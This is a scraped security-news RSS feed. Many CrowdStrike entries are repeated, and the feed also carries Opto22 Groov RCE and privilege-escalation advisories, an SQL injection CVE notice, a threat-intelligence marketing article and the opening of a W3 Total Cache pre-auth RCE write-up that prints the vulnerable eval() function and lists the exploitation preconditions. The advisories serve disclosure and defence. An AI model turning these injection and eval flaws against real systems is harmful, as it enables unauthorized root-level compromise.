Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Falcon Data Protection for Cloud Extends DSPM into Runtime</title><link>https://www.crowdstrike.com/en-us/blog/falcon-data-protection-for-cloud-extends-dspm-into-runtime/</link><author>Luke Hunsinger</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers</title><link>https://www.crowdstrike.com/en-us/blog/crowdstrike-researchers-identify-hidden-vulnerabilities-ai-coded-software/</link><author>Stefan Stein</author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 06:00:00 +0000</pubDate><source url="https://www.crowdstrike.com/en-us/blog/">CrowdStrike Blog</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>TamperedChef Malware Spreads via Fake Software Installers in Ongoing Global Campaign</title><link>https://thehackernews.com/2025/11/tamperedchef-malware-spreads-via-fake.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdYB9Gid2loMKjZaFwuw8YNcXPNMj8a66sEY0z-p0ez7SZf1_vmAIn0fel7zK-zatmZqEc-EssuI89guGsGeOg9G1Vkw6LV7F6QU1W-N1maj6Pws1VrpKl2-sGqrvleq0VF1VTmQHwUzChvzTPcjJPtCIb1pVGT__o4iJoXXYCE0G7h4zb61Y7I-GtLGZn/s1600/software.jpg" length="" type=""/><pubDate>Thu, 20 Nov 2025 04:06:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Threat actors are leveraging bogus installers masquerading as popular software to trick users into installing malware as part of a global malvertising campaign dubbed TamperedChef.
The end goal of the attacks is to establish persistence and deliver JavaScript malware that facilitates remote access and control, per a new report from Acronis Threat Research Unit (TRU). The campaign, per the]]></content:encoded></item><item><title>HelixGuard uncovers malicious &quot;spellchecker&quot; packages on PyPI using multi-layer encryption to steal crypto wallets.</title><link>https://helixguard.ai/blog/malicious-spellcheckers-2025-11-19</link><author>/u/Fit_Wing3352</author><category>netsec</category><pubDate>Thu, 20 Nov 2025 03:36:10 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Breaking Oracle’s Identity Manager: Pre-Auth RCE (CVE-2025-61757)</title><link>https://slcyber.io/research-center/breaking-oracles-identity-manager-pre-auth-rce/</link><author>/u/Mempodipper</author><category>netsec</category><pubDate>Thu, 20 Nov 2025 03:18:43 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ISC Stormcast For Thursday, November 20th, 2025 https://isc.sans.edu/podcastdetail/9708, (Thu, Nov 20th)</title><link>https://isc.sans.edu/diary/rss/32504</link><author></author><category>threatintel</category><pubDate>Thu, 20 Nov 2025 02:00:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>RBAC Privilege Escalation via Opto22 Groov View API</title><link>https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-wvxp-wpwp-mmpw</link><author>ismai1337</author><category>vulns</category><pubDate>Thu, 20 Nov 2025 00:00:28 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[/

 **external-disclosures** Public

# RBAC Privilege Escalation via Opto22 Groov View API

## Package

Opto22 Groov EPICS

## Affected versions

All versions prior to 4.0.3

## Patched versions

4.0.3

## Description

### Impact

The View Users API endpoint returns a list of all users and associated metadata- including the web API tokens. This endpoint requires an Editor role to access and will display API keys for all users, including system-wide admins.

### Vulnerability Description

A RBAC privilege escalation issue was found allowing a malicious user with the Editor role to escalate to admin level access by leaking targeted web API tokens.

### Identification and Remediation

This issue was identified during a Red Team X assessment and is disclosed in ​​CVE-2025-13084. This issue has since been resolved and a fix has been made available for customers.]]></content:encoded></item><item><title>Remote Code Execution via Opto22 Groov Manage REST API</title><link>https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-jq6g-ccmp-vccr</link><author>ismai1337</author><category>vulns</category><pubDate>Thu, 20 Nov 2025 00:00:28 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[**external-disclosures** Public

# Remote Code Execution via Opto22 Groov Manage REST API

## Package

## Affected versions

## Patched versions

## Description

### Impact

The Opto22 Groov Manage maintenance application endpoint is vulnerable to remote code execution. This means an attacker can create a specially crafted request that when executed will achieve remote code execution in the context of the Opto Edge web application which is running as root.

### Vulnerability Description

When a POST request is executed against the /manage/api/v1/maintenance/update/apply endpoint, the application reads the uploader-file-id header from the request and unsafely uses this value to build a command to delete a file- allowing an attacker to inject arbitrary commands which execute as root.

### Identification and Remediation

This issue was identified during a Red Team X assessment and is disclosed in ​CVE-2025-13087. This issue has since been resolved and a fix has been made available for customers.]]></content:encoded></item><item><title>OpenAI says its latest GPT-5.1 Codex can code independently for hours</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/openai-says-its-latest-gpt-51-codex-can-code-independently-for-hours/</link><author>Mayank Parmar</author><category>security</category><pubDate>Thu, 20 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[OpenAI has started rolling out GPT 5.1-Codex-Max on Codex with a better performance on coding tasks. [...]]]></content:encoded></item><item><title>Threat Intelligence Automation</title><link>https://www.recordedfuture.com/blog/threat-intelligence-automation</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_10fad5051847a2e2fec903fc5387af7690cc597ae.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Thu, 20 Nov 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[Enhanced SOC efficiency: Automation filters false positives and handles repetitive tasks so analysts focus on true threats.Recorded Future advantage: Recorded Future’s Intelligence Cloud delivers automated threat protection through real-time data collection, machine learning analysis, and seamless integrations with tools like SIEM, SOAR, and EDR.Future-ready defense: AI and ML algorithms adapt to new attack patterns, enabling predictive threat detection and rapid response.Introduction: The Need for Speed in CybersecurityCyber threats are expanding in volume, complexity, and velocity. Enterprises receive thousands of security alerts every single day, and human analysts manually collecting and correlating threat data can’t keep up. These reactive workflows lead to slow threat detection and delayed response, giving attackers more time to cause damage. The result is not only missed attacks but also burned-out analysts, who face constant alert fatigue and repetitive tasks.When a breach can unfold in minutes, organizations can’t afford hours (or days) of lag. Threat intelligence automation allows security teams to respond to indicators of compromise (IOCs) within seconds, stopping attacks before they spread—and reducing the potential financial and reputational damages from a breach. The push for speed has spurred a rise in AI and automation across cybersecurity as security leaders increasingly recognize how real-time, autonomous decisions can bolster defense.What Is Automated Threat Protection?Automated threat protection, also known as autonomous threat protection, refers to the use of advanced technologies—including AI and ML—to continuously gather, analyze, and act on threat intelligence without manual intervention. It streamlines the entire threat intelligence lifecycle, from data collection to detection to response, at machine speed.Core capabilities of automated threat protection platforms include ingesting data from diverse sources (open web, dark web, technical feeds, internal logs, etc.), automatically correlating and analyzing threat signals, and triggering protective actions or alerts. Key functions often include real-time monitoring for IOCs, enrichment of alerts with contextual data, automated risk scoring of threats, and even initiating response workflows via SOAR (Security Orchestration, Automation, and Response) playbooks. These systems excel at processing information at a scale and speed impossible for human operators.To illustrate the difference: in a manual workflow, if a new phishing domain targeting your company is discovered, an analyst might spend precious time gathering WHOIS information, checking threat feeds for references, assessing the domain’s legitimacy, and then coordinating a response. By the time this manual analysis is done, the phishing campaign could have claimed victims. In contrast, automated threat protection can instantly recognize the suspicious domain, enrich the alert with WHOIS data and threat actor profiles, check if the domain appears in malware or phishing databases, and even automatically block the domain via integrated security controls, all before a human even starts investigating.How Threat Intelligence Automation Enhances Real-Time Security DecisionsFaster Detection and ResponseAutomation enables security teams to detect threats or intrusions within moments of their emergence. By automatically correlating internal logs with external intelligence feeds, an automated system can spot malicious activity and trigger a response in machine time. This might mean isolating a compromised host or alerting on a zero-day exploit mere seconds after it’s observed. The net effect is that incidents are contained before they escalate widely.Intelligent automation learns what “normal” looks like in an environment and filters out the noise of benign events or erroneous alerts. Over time, machine learning models can identify patterns of false positives and automatically dismiss or deprioritize them. By letting automation sift signal from noise, human analysts can reclaim hours of wasted time and focus attention on genuine threats.Improved Threat PrioritizationAutomated threat intelligence tools provide rich context around each indicator or alert instantly. For example, when an alert comes in, an automation system might automatically append information about the involved IP’s reputation, associated malware, threat actor groups, prevalence in the wild, and more. This contextual enrichment allows the system to assess which alerts pose the greatest risk.Consistent, round-the-clock protectionAutomated systems never sleep, operating 24/7 with consistency and scaling to handle surges in threat activity. This around-the-clock monitoring means critical warnings are never missed and aligns security operations to the always-on nature of cyber attacks. Automation also enforces consistency in how threats are handled; a playbook executed by a machine will run the same way every time, reducing the variability (and potential errors) of human responses.Recorded Future’s Approach to Automated Threat ProtectionRecorded Future’s Intelligence Cloud is a SaaS platform that delivers real-time, automated threat intelligence at scale. It continuously collects billions of data points from across the open web, dark web, technical sources (like malware feeds and network telemetry), as well as insights from Recorded Future’s own research team, Insikt Group®. All of this data is analyzed and risk-scored in real time using machine learning algorithms.A key strength of Recorded Future’s approach is seamless integration. The Intelligence Cloud connects directly with popular SIEM, SOAR, EDR, and Threat Intelligence Platform (TIP) tools. This means when your SOC’s SIEM generates an alert, Recorded Future automatically enriches that alert with context within the tool you’re already using. If an alert about a suspicious IP comes into your SIEM, the Intelligence Cloud can, in real time, append that IP’s risk score, known associations, or related domains—even triggering automated response playbooks in your SOAR platform based on its intelligence.Recorded Future’s platform assigns risk scores to IOCs in real time, using analytics that weigh factors like novelty, prevalence, and severity of associated threat activity. So when an alert involving a particular IOC hits a SOC, the Intelligence Cloud has already flagged it as high risk and enriched it with context, such as the ransomware family or threat actor.Recorded Future’s approach centers on delivering actionable insight in real time and automating wherever possible. Teams can trust they’re never operating on out-of-date information, and that many threat defense actions are happening autonomously at machine speed.Example use cases include: Suppose a new phishing email campaign targeting a financial institution is identified. Recorded Future’s Intelligence Cloud can automatically spot the phishing domains or URLs as soon as they appear on phishing feeds or dark web forums, immediately flagging them as malicious, enriching them with context, and integrating with your email security or firewall to block them.Vulnerability prioritization: Recorded Future’s automation helps organizations stay ahead by tracking vulnerability disclosures and exploit chatter continuously. If a new critical vulnerability is published, the Intelligence Cloud will instantly assess if there are exploit kits or threat actors discussing it. Through integrations, it can automatically create a ticket in your ITSM or send an alert to your vulnerability management dashboard highlighting that this CVE is under active attack and should be prioritized.Benefits of Adopting Recorded Future for Automated Threat ProtectionSpeed and Scale in Decision-MakingThrough automation, organizations can make security decisions at a speed and scale that human teams alone cannot match. Threats are identified, contextualized, and even countered in real time. This machine-speed detection and response means attacks can be thwarted before they escalate into major incidents, compressing the threat response timeline from what might be hours or days down to minutes.Better Resource AllocationWhen you automate data gathering and initial threat analysis, skilled personnel are freed up to focus on what they do best: in-depth investigations, incident response, threat hunting, and security strategy. This not only improves job satisfaction but also means your team’s expertise is directed at tasks that truly require human judgement. This often leads to cost savings or the ability to handle more threats with the same headcount.Continuous Monitoring With Global VisibilityRecorded Future provides continuous, 24/7 monitoring of threats worldwide. It’s like having an around-the-clock sentry that never takes a break. Organizations gain insight into emerging threats and external risks relevant to them, no matter where those threats originate. If a threat actor in another part of the world starts planning attacks against your industry, Recorded Future’s platform may pick up on early warning signs and automatically alert you. This means you’re not only monitoring your internal environment but also the external horizon for incoming risks, all through an automated system.Reduced time to detect and respondUltimately, adopting an automated threat intelligence solution like Recorded Future dramatically reduces the Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) for security incidents. Automated response or enrichment means incidents can be contained or remediated far faster. A faster detection/response cycle directly correlates with minimizing damage—the quicker you intercept an attack, the less harm it can do. If you can cut your detection time from the industry average of ~200 days down to near real-time, you potentially save millions in breach costs.Strengthened security postureBy integrating real-time insights and automated actions into daily operations, organizations can close security gaps and achieve a more consistent defense posture. Automation ensures that no critical threat intelligence is missed or ignored, and that defenses are applied uniformly across the board. Moreover, automation enforces best practices automatically, ensuring processes are followed correctly every time. All of this leads to a significant uplift in an organization’s ability to prevent breaches and handle incidents effectively.Practical Applications and Use CasesModern threat intelligence platforms can automatically detect and surface indicators of compromise that matter to your organization. Rather than relying on an analyst to manually find a malicious IP or file hash buried in feeds, automation pulls these out in real time. If chatter about a new malware hash or command-and-control server related to your industry appears on a dark web forum, for example, the system will immediately flag it, ensuring you learn of emerging threats the moment they arise.Threat Hunting with Automated EnrichmentThreat hunters and researchers greatly benefit from automation when investigating suspicious events. Suppose an analyst is digging into an odd network beacon that might indicate a hidden attacker. With automated enrichment tools, they can get additional context in seconds, such as domain reputation, related threats, or historical occurrences of that indicator. The analyst enters the indicator and the platform aggregates intelligence from open source feeds, commercial intel, and internal data. This on-demand enrichment provides deeper insights instantly, improving both the speed and accuracy of threat hunts.Proactive Defense Through Vulnerability IntelligenceRather than playing catch-up after hackers exploit a vulnerability, organizations can use threat intelligence automation to stay ahead of exploits. Automated systems continuously track CVEs, exploit releases, and even discussions on hacking forums about particular software weaknesses. When something relevant to your tech stack pops up, the system will alert you and provide threat context (e.g., known exploits or ransomware leveraging that CVE). This proactive vulnerability intelligence means you can patch or implement mitigations before an attack hits.Banks and financial institutions face constant phishing, fraud, and account takeover attempts. Threat intelligence automation helps instantly flag things like fraudulent banking websites impersonating the institution, or dumps of customer credentials on the dark web. If a fake banking login page is spun up to phish customers, an automated system can detect that site and raise an alert before any customers fall victim. Similarly, automation assists in fraud detection by correlating internal transaction anomalies with known threat patterns in real time. If a series of suspicious money transfers aligns with a known fraud tactic described in threat intel reports, the system can bring it to analysts’ attention immediately.Government agencies and defense organizations are high-value targets for state-sponsored cyber attacks. Threat intelligence automation gives these SOCs an upper hand by continuously scanning for indicators of nation-state campaigns targeting them. For instance, an automated platform might monitor for malware signatures, spear-phishing themes, or infrastructure known to be used by groups hostile to a particular country. The moment something matching those patterns is found, the system immediately alerts the security team. This real-time awareness is critical for government SOCs to mobilize defenses against advanced threats.Hospitals and healthcare providers are frequently targeted by ransomware, data theft, and other cyberattacks that can literally put lives at risk. Automated threat intelligence in healthcare monitors for signs of impending attacks and provides early warnings. If an underground forum post indicates interest in exploiting a particular healthcare software, the security team can be alerted to fortify that system preemptively. This sector also benefits from automation in disrupting criminal activities: for example, automated systems can detect illicit online marketplaces selling stolen patient data or fake pharmaceutical websites that could harm public trust.Future of Threat Intelligence AutomationAs cyber threats evolve, automated defense systems will evolve alongside them, becoming self-learning. In the near future, these systems could autonomously adjust detection thresholds or even launch countermeasures based on learned experience, further reducing the need for human tuning. Recorded Future is at the forefront of this trend, embedding advanced AI into its Intelligence Cloud for capabilities like predictive risk scoring, anomaly detection at scale, and automated decision support. The vision is that intelligence automation becomes an indispensable co-pilot for every security team, helping humans make better decisions faster.However, it’s important to note that attackers are also embracing AI to automate and enhance their attacks. In response, defensive AI systems are being developed to spot AI-generated threats and respond at machine speed. In this escalating battle, organizations that invest early in threat intelligence automation and AI will possess the agile, self-updating defenses needed to counter AI-augmented cyber attacks.Start Protecting Your Business With Threat Intelligence Automation TodayCyber attacks are accelerating and evolving on a daily basis. This reality makes traditional, purely manual security operations untenable. The longer it takes to detect and respond to threats, the greater the potential damage. By automating intelligence collection and response, organizations drastically improve their chances of stopping breaches in time.Recorded Future’s Intelligence Cloud offers an unparalleled combination of real-time breadth , analytical depth, and seamless actionability.Ready to accelerate your security operations with threat intelligence automation? Reach out for a demo or trial to experience how real-time threat intelligence automation can make all the difference in protecting your business.]]></content:encoded></item><item><title>LITE XL RCE (CVE-2025-12121)</title><link>https://bend0us.github.io/vulnerabilities/lite-xl-rce/</link><author>/u/LumpyElk1604</author><category>netsec</category><pubDate>Wed, 19 Nov 2025 22:38:03 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Sneaky2FA PhaaS kit now uses redteamers&apos; Browser-in-the-Browser attack</title><link>https://www.bleepingcomputer.com/news/security/sneaky2fa-phaas-kit-now-uses-redteamers-browser-in-the-browser-attack/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 19 Nov 2025 21:59:46 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Sneaky2FA, a popular among cybercriminals phishing-as-a-service (PhaaS) kit, has added Browser-in-the-Browser (BitB) capabilities, giving "customers" the option to launch highly deceptive attacks. [...]]]></content:encoded></item><item><title>Google&apos;s Gemini 3 is living up to the hype and creating games in one shot</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/googles-gemini-3-is-living-up-to-the-hype-and-creating-games-in-one-shot/</link><author>Mayank Parmar</author><category>security</category><pubDate>Wed, 19 Nov 2025 20:39:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google's Gemini 3 is finally here, and we're impressed with the results, but it still does not adhere to my requests as well as Claude Code. [...]]]></content:encoded></item><item><title>CVE-2025-65103 - OpenSTAManager has an authenticated SQL Injection vulnerability in API via &apos;display&apos; parameter</title><link>https://cvefeed.io/vuln/detail/CVE-2025-65103</link><author></author><category>vulns</category><pubDate>Wed, 19 Nov 2025 20:15:54 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-65103
 Nov. 19, 2025, 8:15 p.m. | 1 day, 10 hours ago
OpenSTAManager is an open source management software for technical assistance and invoicing. Prior to version 2.9.5, an authenticated SQL Injection vulnerability in the API allows any user, regardless of permission level, to execute arbitrary SQL queries. By manipulating the display parameter in an API request, an attacker can exfiltrate, modify, or delete any data in the database, leading to a full system compromise. This issue has been patched in version 2.9.5.
 8.8 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>RCE via a malicious SVG in mPDF</title><link>https://medium.com/@brun0ne/rce-via-a-malicious-svg-in-mpdf-216e613b250b</link><author>/u/ZoltyLis</author><category>netsec</category><pubDate>Wed, 19 Nov 2025 19:48:06 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google Search is now using AI to create interactive UI to answer your questions</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/google-search-is-now-using-ai-to-create-interactive-ui-to-answer-your-questions/</link><author>Mayank Parmar</author><category>security</category><pubDate>Wed, 19 Nov 2025 19:45:05 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[In a move that could redefine the web, Google is testing AI-powered, UI-based answers for its AI mode. [...]]]></content:encoded></item><item><title>Exploiting A Pre-Auth RCE in W3 Total Cache For WordPress (CVE-2025-9501)</title><link>https://www.rcesecurity.com/2025/11/exploiting-a-pre-auth-rce-in-w3-total-cache-for-wordpress-cve-2025-9501/</link><author>/u/MrTuxracer</author><category>netsec</category><pubDate>Wed, 19 Nov 2025 19:18:33 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[We recently came across a very brief vulnerability announcement made by WPScan about CVE-2025-9501, which is described as an “Unauthenticated Command Injection” in the quite famous W3 Total Cache plugin for WordPress. This immediately caught our attention because with 1+ million active installations, it is one of the more wide-spread plugins, which we’ve also encountered numerous times in our customer pentests. Since we didn’t believe that it was so easy to exploit, we decided to take WPScan’s one-liner advisory, analysed the plugin’s cache parsing, and build an exploit for it. Kudos to the original researcher “wcraft” who submitted this bug to WPScan.TL;DR: It is technically a pretty straightforward Remote Code Execution, but The attacker needs to know the  secret.Comments must be enabled for unauthenticated users; otherwise it’s just a Post-Auth vulnerability.Page Cache needs to be enabled in the plugin (disabled by default, but it’s the core functionality)According to WPScan’s advisory, the code execution happens in a function called  which is part of the  class. It indeed uses  to execute some code that comes through its first argument :public function _parse_dynamic_mfunc( $matches ) {
	$code1 = trim( $matches[1] );
	$code2 = trim( $matches[2] );
	$code  = ( $code1 ? $code1 : $code2 );

	if ( $code ) {
		$code = trim( $code, ';' ) . ';';

		try {
			ob_start();
			$result = eval( $code ); // phpcs:ignore Generic.PHP.ForbiddenFunctions.Found
			$output = ob_get_contents();
			ob_end_clean();
		} catch ( \Exception $ex ) {
			$result = false;
		}

		if ( false === $result ) {
